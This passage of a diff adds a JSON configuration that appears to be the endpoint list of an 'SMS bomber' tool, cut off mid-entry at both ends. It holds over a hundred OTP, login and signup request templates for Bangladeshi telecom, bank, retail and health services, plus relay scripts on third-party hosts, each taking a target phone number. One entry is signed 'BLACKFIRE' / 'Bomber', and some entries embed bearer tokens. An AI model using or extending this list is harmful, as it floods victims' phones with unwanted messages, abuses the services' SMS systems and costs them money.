+        "url": "https:\/\/circle.robi.com.bd\/mylife\/gateway\/register_fcm.php?regId&msisdn=88*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "9",
+        "name": "Health Plus 2",
+        "url": "http:\/\/45.114.85.19:8080\/v3\/otp\/send?msisdn=88*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "10",
+        "name": "IQRA",
+        "url": "http:\/\/apibeta.iqra-live.com\/api\/v2\/sent-otp\/*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "x-user-channel": "apps"
+        }
+    },
+    {
+        "id": "11",
+        "name": "Shajgoj",
+        "url": "https:\/\/bk.shajgoj.com\/api\/customers\/send-otp",
+        "method": "post",
+        "body": "{\"phone\":\"*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "12",
+        "name": "KhaoDao",
+        "url": "https:\/\/api.eat-z.com\/auth\/customer\/signin",
+        "method": "post",
+        "body": "{\"username\":\"+88*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "13",
+        "name": "ALESHA_CARD",
+        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=*****",
+        "method": "post",
+        "body": "{\"phone\":\"*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "14",
+        "name": "TheMallBD",
+        "url": "https:\/\/themallbd.com\/api\/auth\/otp_login",
+        "method": "post",
+        "body": "{\"phone_number\":\"+88*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "15",
+        "name": "Web Access",
+        "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
+        "method": "post",
+        "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}",
+        "headers": {
+            "content-type": "application\/json",
+            "content-length": "48"
+        }
+    },
+    {
+        "id": "16",
+        "name": "Fundesh",
+        "url": "https:\/\/win.fundesh.com.bd\/authSrv\/auth\/generateOtp",
+        "method": "post",
+        "body": "{\r\n  \"msisdn\": \"*****\",\r\n  \"clientId\": \"d2c_client\"\r\n}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "17",
+        "name": "Circle",
+        "url": "https:\/\/circle.robi.com.bd\/mylife\/appapi\/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "18",
+        "name": "Vestige",
+        "url": "http:\/\/vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com\/notification\/api\/v1\/send\/otp\/v3",
+        "method": "post",
+        "body": "{\"mobileNumber\":\"88*****\",\"countryId\":22}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "19",
+        "name": "Ajkerdeal",
+        "url": "https:\/\/api.ajkerdeal.com\/Recover\/RetrivePassword\/customersignup=null",
+        "method": "post",
+        "body": "{\"CustomerId\": \"01833268701\",\"MobileOrEmail\":\"*****\", \"Type\": 2}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "20",
+        "name": "Dhaka bank",
+        "url": "https:\/\/ezybank.dhakabank.com.bd\/VerifIDExt2\/api\/CustOnBoarding\/VerifyMobileNumber",
+        "method": "post",
+        "body": "{\r\n  \"AccessToken\": \"\",\r\n  \"TrackingNo\": \"\",\r\n  \"mobileNo\": \"*****\",\r\n  \"otpSms\": \"\",\r\n  \"product_id\": \"250\",\r\n  \"requestChannel\": \"MOB\",\r\n  \"trackingStatus\": 5\r\n}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "21",
+        "name": "Arogga",
+        "url": "https:\/\/api.arogga.com\/v1\/auth\/sms\/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0",
+        "method": "post",
+        "body": "mobile=+88*****&fcmToken=&referral=",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "22",
+        "name": "OsudPotro",
+        "url": "https:\/\/api-2.osudpotro.com\/api\/v1\/users\/send_otp",
+        "method": "post",
+        "body": "{\"mobile\":\"+88-*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "23",
+        "name": "Web Access",
+        "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
+        "method": "post",
+        "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "24",
+        "name": "Shajgoj",
+        "url": "https:\/\/shop.shajgoj.com\/wp-admin\/admin-ajax.php",
+        "method": "post",
+        "body": "action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=3563&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F%3Ffbclid%3DIwAR2mUXNZgDYWrrONUqp61_3Ac4vtnaZUUcBUVwFVTjqgymp5x_2i0nULH_k",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "25",
+        "name": "Nesco",
+        "url": "http:\/\/nesco.sslwireless.com\/api\/v1\/login",
+        "method": "post",
+        "body": "phone_number=*****",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "26",
+        "name": "ROBI WEB",
+        "url": "https:\/\/webapi.robi.com.bd\/v1\/send-otp",
+        "method": "post",
+        "body": "{\"phone_number\":\"*****\"}",
+        "headers": {
+            "content-type": "application\/json",
+            "Authorization": " Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"
+        }
+    },
+    {
+        "id": "27",
+        "name": "Shajgoj 2",
+        "url": "https:\/\/shop.shajgoj.com\/wp-admin\/admin-ajax.php",
+        "method": "post",
+        "body": "action=xoo_ml_login_with_otp&xoo-ml-phone-login=*****&xoo-ml-form-token=3490&xoo-ml-form-type=login_user_with_otp&redirect=%252Fmy-account%252F&=",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "28",
+        "name": "Bongo",
+        "url": "https:\/\/api.bongo-solutions.com\/auth\/api\/login\/send-otp",
+        "method": "post",
+        "body": "{\"operator\":\"all\",\"msisdn\":\"88*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "29",
+        "name": "Cinematic",
+        "url": "https:\/\/api.mygp.cinematic.mobi\/api\/v1\/send-common-otp\/88*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json",
+            "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
+        }
+    },
+    {
+        "id": "30",
+        "name": "Ali2BD",
+        "url": "https:\/\/edge.ali2bd.com\/api\/consumer\/v1\/auth\/login",
+        "method": "post",
+        "body": "{\"username\":\"+88*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "31",
+        "name": "Admissionbd",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/admissionbd.php?phone=*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "32",
+        "name": "Ali2bd",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/ali2bd.php?phone=*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "33",
+        "name": "AppLink",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/applink.php?phone=*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "34",
+        "name": "Arogga",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/arogga.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "35",
+        "name": "Bikroy",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/bikroy.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "36",
+        "name": "MuBl",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/bl.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "37",
+        "name": "ChainaOnline",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/chainaonline.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "38",
+        "name": "Chokrojan",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/chakrajan.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "39",
+        "name": "Chorki",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/chorki.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "40",
+        "name": "Circle",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/circel.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "41",
+        "name": "DhakaBank",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/dhakabank.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "42",
+        "name": "Deepto",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/dipto.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "43",
+        "name": "Doctime",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/doctime.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "44",
+        "name": "Easy.com",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/easy.com.bd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "45",
+        "name": "Ecourier",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/ecuriar.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "46",
+        "name": "Flexiplan",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/flexi-plan.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "47",
+        "name": "Fliper",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/fliper.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "48",
+        "name": "Fundedh",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/fundesh.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "49",
+        "name": "Ghuri",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/ghuri.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "50",
+        "name": "Gpoffer",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/gp.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "51",
+        "name": "Gpshop",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/gpshop.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "52",
+        "name": "HishabExp",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/hisab-express.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "53",
+        "name": "HishabLogin",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/hisabelogin.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "54",
+        "name": "Ivr",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/ivr.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "55",
+        "name": "Jeetwinbd",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/jeetwinbd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "56",
+        "name": "Jotno",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/jotno.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "57",
+        "name": "Mcb",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/mcbaffiliate.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "58",
+        "name": "Mokam",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/mokam.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "59",
+        "name": "Moveon",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/moveon.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "60",
+        "name": "Obhai",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/obhai.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "61",
+        "name": "Robinyoffer",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/robi-myoffer.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "62",
+        "name": "Robiweb",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/robi-web.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "63",
+        "name": "Robiweb2",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/robi-web2.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "64",
+        "name": "Rtvreg",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/rtv-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "65",
+        "name": "Rtvlogin",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/rtv-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "66",
+        "name": "Shadhin",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/sadhin.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "67",
+        "name": "Sajgoj",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/sajgoj.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "68",
+        "name": "Shopotreg",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/sopoth-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "69",
+        "name": "Shopotlog",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/sopoth-resend.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "70",
+        "name": "Tallykhata",
+        "url": "https:\/\/api.arifmodz.my.id\/V2\/talikhata.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "71",
+        "name": "Bkash",
+        "url": "https:\/\/www.sineorbiz.com\/wp-content\/plugins\/bkash.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "72",
+        "name": "Castomis Api",
+        "url": "https:\/\/www.tokaweb.xyz\/sms.php?number=*****&sms=Hi Good Morning",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "73",
+        "name": "Rabbitholebd",
+        "url": "https:\/\/apix.rabbitholebd.com\/appv2\/login\/requestOTP",
+        "method": "post",
+        "body": "{\"mobile\":\"*****\"}",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "74",
+        "name": "osudpotro",
+        "url": "https:\/\/api.osudpotro.com\/api\/v1\/users\/send_otp",
+        "method": "post",
+        "body": "{\"mobile\":\"+88*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "75",
+        "name": "Shopoth",
+        "url": "https:\/\/api.shopoth.com\/shop\/api\/v1\/otps\/send",
+        "method": "post",
+        "body": "{\"phone\":\"*****\"}",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "76",
+        "name": "AProd",
+        "url": "https:\/\/prod-api.viewlift.com\/identity\/signup?site=hoichoitv",
+        "method": "post",
+        "body": "{\"requestType\":\"send\",\"phoneNumber\":\"+88*****\",\"emailConsent\":true,\"whatsappConsent\":true}",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "77",
+        "name": "Go App",
+        "url": "https:\/\/go-app.paperfly.com.bd\/merchant\/api\/react\/registration\/request_registration.php",
+        "method": "-- Select Method --",
+        "body": "{\"full_name\":\"BLACKFIRE\",\"company_name\":\"Bomber\",\"email_address\":\"blactfiretools@gmail.com\",\"phone_number\":\"*****\"}",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "78",
+        "name": "8m-forget.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/8m-forget.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "79",
+        "name": "b8m-reg.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/b8m-reg.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "80",
+        "name": "admissionbd.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/admissionbd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "81",
+        "name": "aibl.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/aibl.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "82",
+        "name": "ail2bd.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/ali2bd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "83",
+        "name": "apex.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/apex.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "84",
+        "name": "applink.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/applink.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "85",
+        "name": "arogga.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/arogga.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "86",
+        "name": "bdtikets.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bdtikets.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "87",
+        "name": "bdtikets2.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bdtikets2.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "88",
+        "name": "betonbook.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/betonbook.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "89",
+        "name": "bikroy.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bikroy.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "90",
+        "name": "bioscope.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bioscope.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "91",
+        "name": "bjbaji.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bjbaji.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "92",
+        "name": "bkash.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bkash.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "93",
+        "name": "bl.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bl.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "94",
+        "name": "bongobd.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/bongobd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "95",
+        "name": "busbdlogin.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/busbdlogin.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "96",
+        "name": "chainaonline.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/chainaonline.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "97",
+        "name": "chakrajan.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/chakrajan.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "98",
+        "name": "chorki.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/chorki.php?phone=*****",
+        "method": "post",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "99",
+        "name": "cinematic.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/cinematic.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "100",
+        "name": "cineplex.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/cineplex.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "101",
+        "name": "cinespot.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/cinespot.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "102",
+        "name": "circel.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/circel.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "103",
+        "name": "daktarbhai.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/daktarbhai.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "104",
+        "name": "dhakabank.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/dhakabank.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "105",
+        "name": "dipto.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/dipto.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "106",
+        "name": "dmss.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/dmss.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "107",
+        "name": "doctime.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/doctime.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "108",
+        "name": "easy.com.bd",
+        "url": "https:\/\/api.blackfire-tools.xyz\/easy.com.bd.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "109",
+        "name": "ecuriar.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/ecuriar.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "110",
+        "name": "engage-token.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/engage-token.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/json"
+        }
+    },
+    {
+        "id": "111",
+        "name": "engage.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/engage.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "112",
+        "name": "enobazar.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/enobazar.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "113",
+        "name": "entertainment.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/entertainment.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "114",
+        "name": "eshop-bl.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/eshop-bl.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "115",
+        "name": "flexi-plan.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/flexi-plan.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "116",
+        "name": "fliper.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/fliper.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "117",
+        "name": "food-collection.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/food-collection.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
+            "content-type": "application\/x-www-form-urlencoded"
+        }
+    },
+    {
+        "id": "118",
+        "name": "fsibl.php",
+        "url": "https:\/\/api.blackfire-tools.xyz\/fsibl.php?phone=*****",
+        "method": "get",
+        "body": "",
+        "headers": {
